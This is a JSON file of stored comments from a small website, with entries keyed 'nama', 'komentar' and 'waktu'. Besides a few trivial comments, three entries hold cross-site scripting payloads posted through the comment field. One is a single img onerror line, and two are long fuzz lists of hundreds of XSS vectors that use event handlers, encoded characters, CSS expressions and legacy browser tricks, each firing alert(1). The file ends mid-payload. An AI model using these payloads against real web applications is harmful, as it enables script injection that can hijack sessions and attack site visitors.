{
    "0": [
        {
            "nama": "admin",
            "komentar": "hello world",
            "waktu": "30 June 2025 04:50"
        },
        {
            "nama": "admin",
            "komentar": "gacorr",
            "waktu": "30 June 2025 04:50"
        }
    ],
    "2": [
        {
            "nama": "Nafal Mumtaz Fuadi",
            "komentar": "Ttt",
            "waktu": "04 July 2025 01:54"
        }
    ],
    "1": [
        {
            "nama": "sasd",
            "komentar": "<img src =q onerror=prompt(8)>",
            "waktu": "08 July 2025 03:13"
        },
        {
            "nama": "Akte Pendirian Perusahaan",
            "komentar": "ody onpagehide body onpagehide=\"javascript:javascript:alert(1)\"><\/body onpagehide>\r\n<svg onunload svg onunload=\"javascript:javascript:alert(1)\"><\/svg onunload>\r\n<applet onerror applet onerror=\"javascript:javascript:alert(1)\"><\/applet onerror>\r\n<body onkeyup body onkeyup=\"javascript:javascript:alert(1)\"><\/body onkeyup>\r\n<body onunload body onunload=\"javascript:javascript:alert(1)\"><\/body onunload>\r\n<iframe onload iframe onload=\"javascript:javascript:alert(1)\"><\/iframe onload>\r\n<body onload body onload=\"javascript:javascript:alert(1)\"><\/body onload>\r\n<html onmouseover html onmouseover=\"javascript:javascript:alert(1)\"><\/html onmouseover>\r\n<object onbeforeload object onbeforeload=\"javascript:javascript:alert(1)\"><\/object onbeforeload>\r\n<body onbeforeunload body onbeforeunload=\"javascript:javascript:alert(1)\"><\/body onbeforeunload>\r\n<body onfocus body onfocus=\"javascript:javascript:alert(1)\"><\/body onfocus>\r\n<body onkeydown body onkeydown=\"javascript:javascript:alert(1)\"><\/body onkeydown>\r\n<iframe onbeforeload iframe onbeforeload=\"javascript:javascript:alert(1)\"><\/iframe onbeforeload>\r\n<iframe src iframe src=\"javascript:javascript:alert(1)\"><\/iframe src>\r\n<svg onload svg onload=\"javascript:javascript:alert(1)\"><\/svg onload>\r\n<html onmousemove html onmousemove=\"javascript:javascript:alert(1)\"><\/html onmousemove>\r\n<body onblur body onblur=\"javascript:javascript:alert(1)\"><\/body onblur>\r\n\\x3Cscript>javascript:alert(1)<\/script>\r\n'\"`><script>\/* *\\x2Fjavascript:alert(1)\/\/ *\/<\/script>\r\n<script>javascript:alert(1)<\/script\\x0D\r\n<script>javascript:alert(1)<\/script\\x0A\r\n<script>javascript:alert(1)<\/script\\x0B\r\n<script charset=\"\\x22>javascript:alert(1)<\/script>\r\n<!--\\x3E<img src=xxx:x onerror=javascript:alert(1)> -->\r\n--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->\r\n--><!-- --\\x00> <img src=xxx:x onerror=javascript:alert(1)> -->\r\n--><!-- --\\x21> <img src=xxx:x onerror=javascript:alert(1)> -->\r\n--><!-- --\\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->\r\n`\"'><img src='#\\x27 onerror=javascript:alert(1)>\r\n<a href=\"javascript\\x3Ajavascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n\"'`><p><svg><script>a='hello\\x27;javascript:alert(1)\/\/';<\/script><\/p>\r\n<a href=\"javas\\x00cript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"javas\\x07cript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"javas\\x0Dcript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"javas\\x0Acript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"javas\\x08cript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"javas\\x02cript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"javas\\x03cript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"javas\\x04cript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"javas\\x01cript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"javas\\x05cript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"javas\\x0Bcript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"javas\\x09cript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"javas\\x06cript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"javas\\x0Ccript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<script>\/* *\\x2A\/javascript:alert(1)\/\/ *\/<\/script>\r\n<script>\/* *\\x00\/javascript:alert(1)\/\/ *\/<\/script>\r\n<style><\/style\\x3E<img src=\"about:blank\" onerror=javascript:alert(1)\/\/><\/style>\r\n<style><\/style\\x0D<img src=\"about:blank\" onerror=javascript:alert(1)\/\/><\/style>\r\n<style><\/style\\x09<img src=\"about:blank\" onerror=javascript:alert(1)\/\/><\/style>\r\n<style><\/style\\x20<img src=\"about:blank\" onerror=javascript:alert(1)\/\/><\/style>\r\n<style><\/style\\x0A<img src=\"about:blank\" onerror=javascript:alert(1)\/\/><\/style>\r\n\"'`>ABC<div style=\"font-family:'foo'\\x7Dx:expression(javascript:alert(1);\/*';\">DEF \r\n\"'`>ABC<div style=\"font-family:'foo'\\x3Bx:expression(javascript:alert(1);\/*';\">DEF \r\n%253Cscript%253Ealert('XSS')%253C%252Fscript%253E\r\n<script>if(\"x\\\\xE1\\x96\\x89\".length==2) { javascript:alert(1);}<\/script>\r\n<script>if(\"x\\\\xE0\\xB9\\x92\".length==2) { javascript:alert(1);}<\/script>\r\n<script>if(\"x\\\\xEE\\xA9\\x93\".length==2) { javascript:alert(1);}<\/script>\r\n'`\"><\\x3Cscript>javascript:alert(1)<\/script>\r\n'`\"><\\x00script>javascript:alert(1)<\/script>\r\n\"'`><\\x3Cimg src=xxx:x onerror=javascript:alert(1)>\r\n\"'`><\\x00img src=xxx:x onerror=javascript:alert(1)>\r\n<script src=\"data:text\/plain\\x2Cjavascript:alert(1)\"><\/script>\r\n<script src=\"data:\\xD4\\x8F,javascript:alert(1)\"><\/script>\r\n<script src=\"data:\\xE0\\xA4\\x98,javascript:alert(1)\"><\/script>\r\n<script src=\"data:\\xCB\\x8F,javascript:alert(1)\"><\/script>\r\n<script\\x20type=\"text\/javascript\">javascript:alert(1);<\/script>\r\n<script\\x3Etype=\"text\/javascript\">javascript:alert(1);<\/script>\r\n<script\\x0Dtype=\"text\/javascript\">javascript:alert(1);<\/script>\r\n<script\\x09type=\"text\/javascript\">javascript:alert(1);<\/script>\r\n<script\\x0Ctype=\"text\/javascript\">javascript:alert(1);<\/script>\r\n<script\\x2Ftype=\"text\/javascript\">javascript:alert(1);<\/script>\r\n<script\\x0Atype=\"text\/javascript\">javascript:alert(1);<\/script>\r\nABC<div style=\"x\\x3Aexpression(javascript:alert(1)\">DEF\r\nABC<div style=\"x:expression\\x5C(javascript:alert(1)\">DEF\r\nABC<div style=\"x:expression\\x00(javascript:alert(1)\">DEF\r\nABC<div style=\"x:exp\\x00ression(javascript:alert(1)\">DEF\r\nABC<div style=\"x:exp\\x5Cression(javascript:alert(1)\">DEF\r\nABC<div style=\"x:\\x0Aexpression(javascript:alert(1)\">DEF\r\nABC<div style=\"x:\\x09expression(javascript:alert(1)\">DEF\r\nABC<div style=\"x:\\xE3\\x80\\x80expression(javascript:alert(1)\">DEF\r\nABC<div style=\"x:\\xE2\\x80\\x84expression(javascript:alert(1)\">DEF\r\nABC<div style=\"x:\\xC2\\xA0expression(javascript:alert(1)\">DEF\r\nABC<div style=\"x:\\xE2\\x80\\x80expression(javascript:alert(1)\">DEF\r\nABC<div style=\"x:\\xE2\\x80\\x8Aexpression(javascript:alert(1)\">DEF\r\nABC<div style=\"x:\\x0Dexpression(javascript:alert(1)\">DEF\r\nABC<div style=\"x:\\x0Cexpression(javascript:alert(1)\">DEF\r\nABC<div style=\"x:\\xE2\\x80\\x87expression(javascript:alert(1)\">DEF\r\nABC<div style=\"x:\\xEF\\xBB\\xBFexpression(javascript:alert(1)\">DEF\r\nABC<div style=\"x:\\x20expression(javascript:alert(1)\">DEF\r\nABC<div style=\"x:\\xE2\\x80\\x88expression(javascript:alert(1)\">DEF\r\nABC<div style=\"x:\\x00expression(javascript:alert(1)\">DEF\r\nABC<div style=\"x:\\xE2\\x80\\x8Bexpression(javascript:alert(1)\">DEF\r\nABC<div style=\"x:\\xE2\\x80\\x86expression(javascript:alert(1)\">DEF\r\nABC<div style=\"x:\\xE2\\x80\\x85expression(javascript:alert(1)\">DEF\r\nABC<div style=\"x:\\xE2\\x80\\x82expression(javascript:alert(1)\">DEF\r\nABC<div style=\"x:\\x0Bexpression(javascript:alert(1)\">DEF\r\nABC<div style=\"x:\\xE2\\x80\\x81expression(javascript:alert(1)\">DEF\r\nABC<div style=\"x:\\xE2\\x80\\x83expression(javascript:alert(1)\">DEF\r\nABC<div style=\"x:\\xE2\\x80\\x89expression(javascript:alert(1)\">DEF\r\n<a href=\"\\x0Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x0Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\xC2\\xA0javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x05javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\xE1\\xA0\\x8Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x18javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x11javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\xE2\\x80\\x88javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\xE2\\x80\\x89javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\xE2\\x80\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x17javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x03javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x0Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x1Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x00javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x10javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\xE2\\x80\\x82javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x20javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x13javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x09javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\xE2\\x80\\x8Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x14javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x19javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\xE2\\x80\\xAFjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x1Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\xE2\\x80\\x81javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x1Djavascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\xE2\\x80\\x87javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x07javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\xE1\\x9A\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\xE2\\x80\\x83javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x04javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x01javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x08javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\xE2\\x80\\x84javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\xE2\\x80\\x86javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\xE3\\x80\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x12javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x0Djavascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x0Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x0Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x15javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\xE2\\x80\\xA8javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x16javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x02javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x1Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x06javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\xE2\\x80\\xA9javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\xE2\\x80\\x85javascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x1Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\xE2\\x81\\x9Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"\\x1Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"javascript\\x00:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"javascript\\x3A:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"javascript\\x09:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"javascript\\x0D:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n<a href=\"javascript\\x0A:javascript:alert(1)\" id=\"fuzzelement1\">test<\/a>\r\n`\"'><img src=xxx:x \\x0Aonerror=javascript:alert(1)>\r\n`\"'><img src=xxx:x \\x22onerror=javascript:alert(1)>\r\n`\"'><img src=xxx:x \\x0Bonerror=javascript:alert(1)>\r\n`\"'><img src=xxx:x \\x0Donerror=javascript:alert(1)>\r\n`\"'><img src=xxx:x \\x2Fonerror=javascript:alert(1)>\r\n`\"'><img src=xxx:x \\x09onerror=javascript:alert(1)>\r\n`\"'><img src=xxx:x \\x0Conerror=javascript:alert(1)>\r\n`\"'><img src=xxx:x \\x00onerror=javascript:alert(1)>\r\n`\"'><img src=xxx:x \\x27onerror=javascript:alert(1)>\r\n`\"'><img src=xxx:x \\x20onerror=javascript:alert(1)>\r\n\"`'><script>\\x3Bjavascript:alert(1)<\/script>\r\n\"`'><script>\\x0Djavascript:alert(1)<\/script>\r\n\"`'><script>\\xEF\\xBB\\xBFjavascript:alert(1)<\/script>\r\n\"`'><script>\\xE2\\x80\\x81javascript:alert(1)<\/script>\r\n\"`'><script>\\xE2\\x80\\x84javascript:alert(1)<\/script>\r\n\"`'><script>\\xE3\\x80\\x80javascript:alert(1)<\/script>\r\n\"`'><script>\\x09javascript:alert(1)<\/script>\r\n\"`'><script>\\xE2\\x80\\x89javascript:alert(1)<\/script>\r\n\"`'><script>\\xE2\\x80\\x85javascript:alert(1)<\/script>\r\n\"`'><script>\\xE2\\x80\\x88javascript:alert(1)<\/script>\r\n\"`'><script>\\x00javascript:alert(1)<\/script>\r\n\"`'><script>\\xE2\\x80\\xA8javascript:alert(1)<\/script>\r\n\"`'><script>\\xE2\\x80\\x8Ajavascript:alert(1)<\/script>\r\n\"`'><script>\\xE1\\x9A\\x80javascript:alert(1)<\/script>\r\n\"`'><script>\\x0Cjavascript:alert(1)<\/script>\r\n\"`'><script>\\x2Bjavascript:alert(1)<\/script>\r\n\"`'><script>\\xF0\\x90\\x96\\x9Ajavascript:alert(1)<\/script>\r\n\"`'><script>-javascript:alert(1)<\/script>\r\n\"`'><script>\\x0Ajavascript:alert(1)<\/script>\r\n\"`'><script>\\xE2\\x80\\xAFjavascript:alert(1)<\/script>\r\n\"`'><script>\\x7Ejavascript:alert(1)<\/script>\r\n\"`'><script>\\xE2\\x80\\x87javascript:alert(1)<\/script>\r\n\"`'><script>\\xE2\\x81\\x9Fjavascript:alert(1)<\/script>\r\n\"`'><script>\\xE2\\x80\\xA9javascript:alert(1)<\/script>\r\n\"`'><script>\\xC2\\x85javascript:alert(1)<\/script>\r\n\"`'><script>\\xEF\\xBF\\xAEjavascript:alert(1)<\/script>\r\n\"`'><script>\\xE2\\x80\\x83javascript:alert(1)<\/script>\r\n\"`'><script>\\xE2\\x80\\x8Bjavascript:alert(1)<\/script>\r\n\"`'><script>\\xEF\\xBF\\xBEjavascript:alert(1)<\/script>\r\n\"`'><script>\\xE2\\x80\\x80javascript:alert(1)<\/script>\r\n\"`'><script>\\x21javascript:alert(1)<\/script>\r\n\"`'><script>\\xE2\\x80\\x82javascript:alert(1)<\/script>\r\n\"`'><script>\\xE2\\x80\\x86javascript:alert(1)<\/script>\r\n\"`'><script>\\xE1\\xA0\\x8Ejavascript:alert(1)<\/script>\r\n\"`'><script>\\x0Bjavascript:alert(1)<\/script>\r\n\"`'><script>\\x20javascript:alert(1)<\/script>\r\n\"`'><script>\\xC2\\xA0javascript:alert(1)<\/script>\r\n\"\/><img\/onerror=\\x0Bjavascript:alert(1)\\x0Bsrc=xxx:x \/>\r\n\"\/><img\/onerror=\\x22javascript:alert(1)\\x22src=xxx:x \/>\r\n\"\/><img\/onerror=\\x09javascript:alert(1)\\x09src=xxx:x \/>\r\n\"\/><img\/onerror=\\x27javascript:alert(1)\\x27src=xxx:x \/>\r\n\"\/><img\/onerror=\\x0Ajavascript:alert(1)\\x0Asrc=xxx:x \/>\r\n\"\/><img\/onerror=\\x0Cjavascript:alert(1)\\x0Csrc=xxx:x \/>\r\n\"\/><img\/onerror=\\x0Djavascript:alert(1)\\x0Dsrc=xxx:x \/>\r\n\"\/><img\/onerror=\\x60javascript:alert(1)\\x60src=xxx:x \/>\r\n\"\/><img\/onerror=\\x20javascript:alert(1)\\x20src=xxx:x \/>\r\n<script\\x2F>javascript:alert(1)<\/script>\r\n<script\\x20>javascript:alert(1)<\/script>\r\n<script\\x0D>javascript:alert(1)<\/script>\r\n<script\\x0A>javascript:alert(1)<\/script>\r\n<script\\x0C>javascript:alert(1)<\/script>",
            "waktu": "08 July 2025 03:13"
        },
        {
            "nama": "sfdfdfs",
            "komentar": "<img \\x00src=x onerror=\"alert(1)\">\r\n<img \\x47src=x onerror=\"javascript:alert(1)\">\r\n<img \\x11src=x onerror=\"javascript:alert(1)\">\r\n<img \\x12src=x onerror=\"javascript:alert(1)\">\r\n<img\\x47src=x onerror=\"javascript:alert(1)\">\r\n<img\\x10src=x onerror=\"javascript:alert(1)\">\r\n<img\\x13src=x onerror=\"javascript:alert(1)\">\r\n<img\\x32src=x onerror=\"javascript:alert(1)\">\r\n<img\\x47src=x onerror=\"javascript:alert(1)\">\r\n<img\\x11src=x onerror=\"javascript:alert(1)\">\r\n<img \\x47src=x onerror=\"javascript:alert(1)\">\r\n<img \\x34src=x onerror=\"javascript:alert(1)\">\r\n<img \\x39src=x onerror=\"javascript:alert(1)\">\r\n<img \\x00src=x onerror=\"javascript:alert(1)\">\r\n<img src\\x09=x onerror=\"javascript:alert(1)\">\r\n<img src\\x10=x onerror=\"javascript:alert(1)\">\r\n<img src\\x13=x onerror=\"javascript:alert(1)\">\r\n<img src\\x32=x onerror=\"javascript:alert(1)\">\r\n<img src\\x12=x onerror=\"javascript:alert(1)\">\r\n<img src\\x11=x onerror=\"javascript:alert(1)\">\r\n<img src\\x00=x onerror=\"javascript:alert(1)\">\r\n<img src\\x47=x onerror=\"javascript:alert(1)\">\r\n<img src=x\\x09onerror=\"javascript:alert(1)\">\r\n<img src=x\\x10onerror=\"javascript:alert(1)\">\r\n<img src=x\\x11onerror=\"javascript:alert(1)\">\r\n<img src=x\\x12onerror=\"javascript:alert(1)\">\r\n<img src=x\\x13onerror=\"javascript:alert(1)\">\r\n<img[a][b][c]src[d]=x[e]onerror=[f]\"alert(1)\">\r\n<img src=x onerror=\\x09\"javascript:alert(1)\">\r\n<img src=x onerror=\\x10\"javascript:alert(1)\">\r\n<img src=x onerror=\\x11\"javascript:alert(1)\">\r\n<img src=x onerror=\\x12\"javascript:alert(1)\">\r\n<img src=x onerror=\\x32\"javascript:alert(1)\">\r\n<img src=x onerror=\\x00\"javascript:alert(1)\">\r\n<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX<\/a>\r\n<img src=\"x` `<script>javascript:alert(1)<\/script>\"` `>\r\n<img src onerror \/\" '\"= alt=javascript:alert(1)\/\/\">\r\n<title onpropertychange=javascript:alert(1)><\/title><title title=>\r\n<a href=http:\/\/foo.bar\/#x=`y><\/a><img alt=\"`><img src=x:x onerror=javascript:alert(1)><\/a>\">\r\n<!--[if]><script>javascript:alert(1)<\/script -->\r\n<!--[if<img src=x onerror=javascript:alert(1)\/\/]> -->\r\n<script src=\"\/\\%(jscript)s\"><\/script>\r\n<script src=\"\\\\%(jscript)s\"><\/script>\r\n<object id=\"x\" classid=\"clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598\"><\/object> <object classid=\"clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B\" onqt_error=\"javascript:alert(1)\" style=\"behavior:url(#x);\"><param name=postdomevents \/><\/object>\r\n<a style=\"-o-link:'javascript:javascript:alert(1)';-o-link-source:current\">X\r\n<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};<\/style>\r\n<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d\r\n<style>@import \"data:,*%7bx:expression(javascript:alert(1))%7D\";<\/style>\r\n<a style=\"pointer-events:none;position:absolute;\"><a style=\"position:absolute;\" onclick=\"javascript:alert(1);\">XXX<\/a><\/a><a href=\"javascript:javascript:alert(1)\">XXX<\/a>\r\n<style>*[{}@import'%(css)s?]<\/style>X\r\n<div style=\"font-family:'foo&#10;;color:red;';\">XXX\r\n<div style=\"font-family:foo}color=red;\">XXX\r\n<\/\/ style=x:expression\\28javascript:alert(1)\\29>\r\n<style>*{x:\uff45\uff58\uff50\uff52\uff45\uff53\uff53\uff49\uff4f\uff4e(javascript:alert(1))}<\/style>\r\n<div style=content:url(%(svg)s)><\/div>\r\n<div style=\"list-style:url(http:\/\/foo.f)\\20url(javascript:javascript:alert(1));\">X\r\n<div id=d><div style=\"font-family:'sans\\27\\3B color\\3Ared\\3B'\">X<\/div><\/div> <script>with(document.getElementById(\"d\"))innerHTML=innerHTML<\/script>\r\n<div style=\"background:url(\/f#&#127;oo\/;color:red\/*\/foo.jpg);\">X\r\n<div style=\"font-family:foo{bar;background:url(http:\/\/foo.f\/oo};color:red\/*\/foo.jpg);\">X\r\n<div id=\"x\">XXX<\/div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  <\/style>\r\n<x style=\"background:url('x&#1;;color:red;\/*')\">XXX<\/x>\r\n<script>({set\/**\/$($){_\/**\/setter=$,_=javascript:alert(1)}}).$=eval<\/script>\r\n<script>({0:#0=eval\/#0#\/#0#(javascript:alert(1))})<\/script>\r\n<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x<\/script>\r\n<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()<\/script>\r\n<meta charset=\"x-imap4-modified-utf7\">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi\r\n<meta charset=\"x-imap4-modified-utf7\">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11\/script&X&>\r\n<meta charset=\"mac-farsi\">\u00bcscript\u00bejavascript:alert(1)\u00bc\/script\u00be\r\nX<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >\r\n1<set\/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img\/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>\r\n1<animate\/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img\/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>\r\n<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss><\/vmlframe>\r\n1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 \/><\/a>\r\n<a style=\"behavior:url(#default#AnchorClick);\" folder=\"javascript:javascript:alert(1)\">XXX<\/a>\r\n<x style=\"behavior:url(%(sct)s)\">\r\n<xml id=\"xss\" src=\"%(htc)s\"><\/xml> <label dataformatas=\"html\" datasrc=\"#xss\" datafld=\"payload\"><\/label>\r\n<event-source src=\"%(event)s\" onload=\"javascript:alert(1)\">\r\n<a href=\"javascript:javascript:alert(1)\"><event-source src=\"data:application\/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A\">\r\n<div id=\"x\">x<\/div> <xml:namespace prefix=\"t\"> <import namespace=\"t\" implementation=\"#default#time2\"> <t:set attributeName=\"innerHTML\" targetElement=\"x\" to=\"&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;\">\r\n<script>%(payload)s<\/script>\r\n<script src=%(jscript)s><\/script>\r\n<script language='javascript' src='%(jscript)s'><\/script>\r\n<script>javascript:alert(1)<\/script>\r\n<IMG SRC=\"javascript:javascript:alert(1);\">\r\n<IMG SRC=javascript:javascript:alert(1)>\r\n<IMG SRC=`javascript:javascript:alert(1)`>\r\n<SCRIPT SRC=%(jscript)s?<B>\r\n<FRAMESET><FRAME SRC=\"javascript:javascript:alert(1);\"><\/FRAMESET>\r\n<BODY ONLOAD=javascript:alert(1)>\r\n<BODY ONLOAD=javascript:javascript:alert(1)>\r\n<IMG SRC=\"jav    ascript:javascript:alert(1);\">\r\n<BODY onload!#$%%&()*~+-_.,:;?@[\/|\\]^`=javascript:alert(1)>\r\n<SCRIPT\/SRC=\"%(jscript)s\"><\/SCRIPT>\r\n<<SCRIPT>%(payload)s\/\/<<\/SCRIPT>\r\n<IMG SRC=\"javascript:javascript:alert(1)\"\r\n<iframe src=%(scriptlet)s <\r\n<INPUT TYPE=\"IMAGE\" SRC=\"javascript:javascript:alert(1);\">\r\n<IMG DYNSRC=\"javascript:javascript:alert(1)\">\r\n<IMG LOWSRC=\"javascript:javascript:alert(1)\">\r\n<BGSOUND SRC=\"javascript:javascript:alert(1);\">\r\n<BR SIZE=\"&{javascript:alert(1)}\">\r\n<LAYER SRC=\"%(scriptlet)s\"><\/LAYER>\r\n<LINK REL=\"stylesheet\" HREF=\"javascript:javascript:alert(1);\">\r\n<STYLE>@import'%(css)s';<\/STYLE>\r\n<META HTTP-EQUIV=\"Link\" Content=\"<%(css)s>; REL=stylesheet\">\r\n<XSS STYLE=\"behavior: url(%(htc)s);\">\r\n<STYLE>li {list-style-image: url(\"javascript:javascript:alert(1)\");}<\/STYLE><UL><LI>XSS\r\n<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:javascript:alert(1);\">\r\n<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http:\/\/;URL=javascript:javascript:alert(1);\">\r\n<IFRAME SRC=\"javascript:javascript:alert(1);\"><\/IFRAME>\r\n<TABLE BACKGROUND=\"javascript:javascript:alert(1)\">\r\n<TABLE><TD BACKGROUND=\"javascript:javascript:alert(1)\">\r\n<DIV STYLE=\"background-image: url(javascript:javascript:alert(1))\">\r\n<DIV STYLE=\"width:expression(javascript:alert(1));\">\r\n<IMG STYLE=\"xss:expr\/*XSS*\/ession(javascript:alert(1))\">\r\n<XSS STYLE=\"xss:expression(javascript:alert(1))\">\r\n<STYLE TYPE=\"text\/javascript\">javascript:alert(1);<\/STYLE>\r\n<STYLE>.XSS{background-image:url(\"javascript:javascript:alert(1)\");}<\/STYLE><A CLASS=XSS><\/A>\r\n<STYLE type=\"text\/css\">BODY{background:url(\"javascript:javascript:alert(1)\")}<\/STYLE>\r\n<!--[if gte IE 4]><SCRIPT>javascript:alert(1);<\/SCRIPT><![endif]-->\r\n<BASE HREF=\"javascript:javascript:alert(1);\/\/\">\r\n<OBJECT TYPE=\"text\/x-scriptlet\" DATA=\"%(scriptlet)s\"><\/OBJECT>\r\n<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)><\/OBJECT>\r\n<HTML xmlns:xss><?import namespace=\"xss\" 